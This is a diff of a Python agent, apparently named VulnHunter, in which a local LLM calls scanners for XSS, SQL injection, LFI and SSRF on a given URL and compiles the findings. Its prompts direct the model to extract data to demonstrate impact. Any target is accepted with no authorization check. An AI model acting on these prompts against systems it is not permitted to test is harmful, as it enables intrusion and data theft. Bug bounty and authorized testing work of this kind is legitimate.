+3. TOOL: test_sqli(url="https://target.com/user?id=1", param="id") - Deep SQLi test
+4. TOOL: report() - Show confirmed findings
 
-## Methodology
-Follow this systematic approach:
+## Rules
+- Only report CONFIRMED vulnerabilities with proof
+- Extract data to demonstrate impact
+- Test all discovered parameters
+- Be fast and thorough"""
 
-### Phase 1: Reconnaissance
-1. Crawl the target to discover URLs, forms, and parameters
-2. Analyze the technology stack (frameworks, libraries)
-3. Identify potential attack surfaces (forms, APIs, file uploads)
-4. Read source code to understand the application
+    def _run_async(self, coro):
+        """Run async code in sync context"""
+        try:
+            loop = asyncio.get_event_loop()
+        except RuntimeError:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+        return loop.run_until_complete(coro)
 
-### Phase 2: Vulnerability Discovery
-1. Test each parameter for common vulnerabilities
-2. Start with quick_scan to identify obvious issues
-3. Use specialized scanners for deeper testing
-4. Generate custom payloads when filters are detected
+    def discover(self, url: str) -> Dict:
+        """Discover forms and parameters"""
+        return self._run_async(self.scanner.find_forms_and_params(url))
 
-### Phase 3: Exploitation & Validation
-1. Confirm vulnerabilities are exploitable
-2. Demonstrate maximum impact
-3. Test bypass techniques if needed
-4. Document reproduction steps
+    def scan(self, url: str) -> Dict:
+        """Full vulnerability scan"""
+        result = self._run_async(self.scanner.full_scan(url))
+        self.findings.extend(result.get("vulnerabilities", []))
+        return result
 
-### Phase 4: Reporting
-1. Create detailed reports for each finding
-2. Include severity, impact, and remediation
-3. Format reports suitable for HackerOne submission
+    def test_xss(self, url: str, param: str) -> List[Dict]:
+        """Test for XSS"""
+        vulns = self._run_async(self.scanner.test_xss(url, param))
+        for v in vulns:
+            self.findings.append(v.to_dict())
+        return [v.to_dict() for v in vulns]
 
-## Tool Usage
-Call tools using this format:
-TOOL: tool_name(param1="value1", param2="value2")
+    def test_sqli(self, url: str, param: str) -> List[Dict]:
+        """Test for SQLi"""
+        vulns = self._run_async(self.scanner.test_sqli(url, param))
+        for v in vulns:
+            self.findings.append(v.to_dict())
+        return [v.to_dict() for v in vulns]
 
-Example:
-TOOL: crawl(url="https://example.com")
-TOOL: scan_xss(url="https://example.com/search?q=test", param="q")
+    def test_lfi(self, url: str, param: str) -> List[Dict]:
+        """Test for LFI"""
+        vulns = self._run_async(self.scanner.test_lfi(url, param))
+        for v in vulns:
+            self.findings.append(v.to_dict())
+        return [v.to_dict() for v in vulns]
 
-## Important Guidelines
-- Always validate findings before reporting
-- Maximize impact (prove data access, demonstrate RCE, etc.)
-- Use bypass techniques when filters are detected
-- Research known CVEs for detected technologies
-- Be thorough - check all parameters and endpoints
-- Generate HackerOne-quality reports
+    def test_ssrf(self, url: str, param: str) -> List[Dict]:
+        """Test for SSRF"""
+        vulns = self._run_async(self.scanner.test_ssrf(url, param))
+        for v in vulns:
+            self.findings.append(v.to_dict())
+        return [v.to_dict() for v in vulns]
 
-Now, let's hunt for vulnerabilities!"""
+    def report(self) -> List[Dict]:
+        """Get all findings"""
+        return self.findings
 
-    def _parse_tool_call(self, text: str) -> Optional[Dict[str, Any]]:
+    def _execute_tool(self, tool_name: str, args: Dict) -> str:
+        """Execute a tool call"""
+        tools = {
+            "discover": lambda: self.discover(args.get("url", self.target_url)),
+            "scan": lambda: self.scan(args.get("url", self.target_url)),
+            "test_xss": lambda: self.test_xss(args.get("url"), args.get("param")),
+            "test_sqli": lambda: self.test_sqli(args.get("url"), args.get("param")),
+            "test_lfi": lambda: self.test_lfi(args.get("url"), args.get("param")),
+            "test_ssrf": lambda: self.test_ssrf(args.get("url"), args.get("param")),
+            "report": lambda: self.report(),
+        }
+        
+        if tool_name not in tools:
+            return json.dumps({"error": f"Unknown tool: {tool_name}"})
+        
+        try:
+            result = tools[tool_name]()
+            return json.dumps(result, indent=2, default=str)
+        except Exception as e:
+            return json.dumps({"error": str(e)})
+
+    def _parse_tool_call(self, text: str) -> Optional[Dict]:
         """Parse tool call from LLM response"""
-        # Look for TOOL: pattern
         pattern = r'TOOL:\s*(\w+)\((.*?)\)'
         match = re.search(pattern, text, re.DOTALL)
         
@@ -452,263 +653,95 @@ Now, let's hunt for vulnerabilities!"""
         tool_name = match.group(1)
         args_str = match.group(2)
         
-        # Parse arguments
         args = {}
-        if args_str.strip():
-            # Handle key="value" format
-            arg_pattern = r'(\w+)\s*=\s*(?:"([^"]*?)"|\'([^\']*?)\'|(\[.*?\]|\{.*?\}|\d+|True|False|None))'
-            for arg_match in re.finditer(arg_pattern, args_str, re.DOTALL):
-                key = arg_match.group(1)
-                # Get the value from whichever group matched
-                value = arg_match.group(2) or arg_match.group(3) or arg_match.group(4)
-                
-                # Parse JSON-like values
-                if value and value.startswith(('[', '{')):
-                    try:
-                        value = json.loads(value.replace("'", '"'))
-                    except:
-                        pass
-                elif value == 'True':
-                    value = True
-                elif value == 'False':
-                    value = False
-                elif value == 'None':
-                    value = None
-                elif value and value.isdigit():
-                    value = int(value)
-                
-                args[key] = value
+        for m in re.finditer(r'(\w+)\s*=\s*["\']([^"\']*)["\']', args_str):
+            args[m.group(1)] = m.group(2)
         
         return {"tool": tool_name, "args": args}
 
-    def _execute_tool(self, tool_name: str, args: Dict) -> str:
-        """Execute a tool and return result"""
-        if tool_name not in self.tools:
-            return f"Error: Unknown tool '{tool_name}'. Available tools: {', '.join(self.tools.keys())}"
-        
-        tool = self.tools[tool_name]
-        
-        try:
-            result = tool.function(**args)
-            return json.dumps(result, indent=2, default=str)
-        except Exception as e:
-            return f"Error executing {tool_name}: {str(e)}"
-
-    def _get_tools_description(self) -> str:
-        """Get description of all available tools"""
-        desc = "## Available Tools\n\n"
-        
-        for name, tool in self.tools.items():
-            desc += f"### {name}\n"
-            desc += f"{tool.description}\n\n"
-            desc += "Parameters:\n"
-            for param, info in tool.parameters.items():
-                required = info.get("required", False)
-                default = info.get("default", "")
-                desc += f"- `{param}`: {info.get('description', '')} "
-                if required:
-                    desc += "(required)"
-                elif default:
-                    desc += f"(default: {default})"
-                desc += "\n"
-            if tool.examples:
-                desc += f"\nExample: `{tool.examples[0]}`\n"
-            desc += "\n"
-        
-        return desc
-
     def chat(self, message: str) -> str:
-        """
-        Send a message to the LLM and get response with tool execution
-        
-        Args:
-            message: User message
-        
-        Returns:
-            LLM response
-        """
+        """Chat with LLM and execute tools"""
         if not OLLAMA_AVAILABLE:
-            return "Error: Ollama is not installed. Please install with: pip install ollama"
+            return "Ollama not installed. Run: pip install ollama"
         
-        # Add message to conversation
         self.conversation.append({"role": "user", "content": message})
         
-        # Build full prompt with context
         messages = [
             {"role": "system", "content": self.system_prompt},
             *self.conversation
         ]
         
         try:
-            # Get LLM response
-            response = ollama.chat(
-                model=self.model,
-                messages=messages
-            )
+            response = ollama.chat(model=self.model, messages=messages)
+            reply = response['message']['content']
             
-            assistant_message = response['message']['content']
-            
-            # Check for tool calls
-            tool_call = self._parse_tool_call(assistant_message)
-            
+            # Check for tool call
+            tool_call = self._parse_tool_call(reply)
             if tool_call:
-                # Execute tool
-                tool_result = self._execute_tool(tool_call["tool"], tool_call["args"])
-                
-                # Add tool result to conversation
+                result = self._execute_tool(tool_call["tool"], tool_call["args"])
+                self.conversation.append({"role": "assistant", "content": reply})
                 self.conversation.append({
-                    "role": "assistant", 
-                    "content": f"I called {tool_call['tool']} and got:\n```json\n{tool_result}\n```\n\n{assistant_message}"
+                    "role": "user", 
+                    "content": f"Tool result:\n```json\n{result}\n```\nAnalyze and continue."
                 })
-                
-                # Get follow-up analysis
-                follow_up = f"Tool result for {tool_call['tool']}:\n```json\n{tool_result}\n```\n\nAnalyze this result and continue hunting."
-                
-                return self.chat(follow_up)
+                return self.chat("")  # Continue conversation
             
-            # No tool call, just return response
-            self.conversation.append({"role": "assistant", "content": assistant_message})
-            return assistant_message
+            self.conversation.append({"role": "assistant", "content": reply})
+            return reply
             
         except Exception as e:
-            return f"Error communicating with Ollama: {str(e)}"
+            return f"Error: {e}"
 
     def start(self, target_url: str) -> str:
-        """
-        Start a bug hunting session on a target
-        
-        Args:
-            target_url: Target URL to hunt on
-        
-        Returns:
-            Initial analysis
-        """
+        """Start hunting on target"""
         self.target_url = target_url
-        self.conversation = []  # Reset conversation
+        self.conversation = []
+        self.findings = []
         
-        initial_message = f"""I want to hunt for vulnerabilities on: {target_url}
+        return self.chat(f"""Hunt for vulnerabilities on: {target_url}
 
-Please start by:
-1. Crawling the site to discover the attack surface
-2. Analyzing the technology stack
-3. Identifying potential vulnerability points
-4. Begin testing for critical vulnerabilities
+1. First discover forms and parameters
+2. Then scan for XSS, SQLi, LFI, SSRF
+3. Confirm and report only real vulnerabilities with proof
+4. Extract data to demonstrate impact
 
-Focus on finding high-impact bugs like:
-- SQL Injection
-- XSS with session hijacking potential
-- SSRF with cloud metadata access
-- Authentication bypass
-- IDOR exposing sensitive data
-
-Let's find some critical vulnerabilities!"""
-        
-        return self.chat(initial_message)
+Start now!""")
 
     def continue_hunt(self, instruction: str = "") -> str:
-        """
-        Continue the hunt with optional instruction
-        
-        Args:
-            instruction: Optional specific instruction
-        
-        Returns:
-            LLM response
-        """
-        if instruction:
-            return self.chat(instruction)
-        else:
-            return self.chat("Continue hunting for vulnerabilities. What should we test next?")
+        """Continue hunting"""
+        return self.chat(instruction or "Continue scanning and report findings.")
 
     def get_report(self) -> str:
-        """Get a summary report of all findings"""
-        findings = self.web_tools.get_findings()
+        """Get formatted report"""
+        if not self.findings:
+            return "No confirmed vulnerabilities found."
         
-        if not findings:
-            return "No vulnerabilities found yet."
+        report = f"# Vulnerability Report\n"
+        report += f"**Target:** {self.target_url}\n"
+        report += f"**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
+        report += f"**Total Findings:** {len(self.findings)}\n\n"
         
-        return self.report_tools.create_summary_report(findings)
-
-    def interactive_session(self):
-        """Run an interactive hunting session"""
-        print("=" * 60)
-        print("VulnHunter - AI-Powered Bug Hunting")
-        print("=" * 60)
-        print(f"Using model: {self.model}")
-        print("Type 'quit' to exit, 'report' for findings summary")
-        print("=" * 60)
+        for i, v in enumerate(self.findings, 1):
+            report += f"## {i}. {v['type']} - {v['severity'].upper()}\n"
+            report += f"- **URL:** {v['url']}\n"
+            report += f"- **Parameter:** {v['param']}\n"
+            report += f"- **Payload:** `{v['payload']}`\n"
+            report += f"- **Evidence:** {v['evidence']}\n"
+            if v.get('extracted_data'):
+                report += f"- **Extracted Data:** {v['extracted_data'][:200]}\n"
+            report += "\n"
         
-        target = input("\nEnter target URL: ").strip()
-        if not target:
-            print("No target provided. Exiting.")
-            return
-        
-        print("\nStarting hunt...")
-        print(self.start(target))
-        
-        while True:
-            user_input = input("\n> ").strip()
-            
-            if user_input.lower() == 'quit':
-                print("\nFinal Report:")
-                print(self.get_report())
-                break
-            elif user_input.lower() == 'report':
-                print(self.get_report())
-            elif user_input.lower() == 'tools':
-                print(self._get_tools_description())
-            else:
-                response = self.continue_hunt(user_input)
-                print(response)
+        return report
 
 
-# Simple execution functions for direct tool use without LLM
-def quick_hunt(url: str, model: str = "llama3.1:8b") -> str:
-    """Quick hunt function for simple usage"""
-    hunter = VulnHunterLLM(model=model)
-    return hunter.start(url)
+def quick_scan(url: str) -> Dict:
+    """Quick standalone scan without LLM"""
+    scanner = FastScanner()
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    return loop.run_until_complete(scanner.full_scan(url))
 
 
-def manual_scan(url: str, scan_type: str = "all") -> Dict[str, Any]:
-    """Manual scan without LLM - direct tool usage"""
-    tools = WebTools()
-    
-    results = {
-        "target": url,
-        "timestamp": datetime.now().isoformat(),
-        "findings": []
-    }
-    
-    # Crawl first
-    print(f"Crawling {url}...")
-    crawl_result = tools.crawl(url, depth=2)
-    results["crawl"] = crawl_result
-    
-    # Get parameters to test
-    params_to_test = crawl_result.get("parameters", {})
-    forms = crawl_result.get("forms", [])
-    
-    print(f"Found {len(params_to_test)} parameters and {len(forms)} forms")
-    
-    # Test each discovered URL with parameters
-    for discovered_url in crawl_result.get("urls_discovered", [])[:10]:
-        if "?" in discovered_url:
-            from urllib.parse import urlparse, parse_qs
-            parsed = urlparse(discovered_url)
-            params = parse_qs(parsed.query)
-            
-            for param in params:
-                print(f"Testing {param} on {discovered_url[:50]}...")
-                
-                if scan_type in ["all", "quick"]:
-                    scan_result = tools.quick_scan(discovered_url, param)
-                    for vuln_type, data in scan_result.items():
-                        if isinstance(data, dict) and data.get("vulnerable"):
-                            results["findings"].append({
-                                "type": vuln_type,
-                                "url": discovered_url,
-                                "param": param,
-                                **data
-                            })
-    
-    return results
+def manual_scan(url: str, scan_type: str = "all") -> Dict:
+    """Manual scan for CLI usage"""
+    return quick_scan(url)
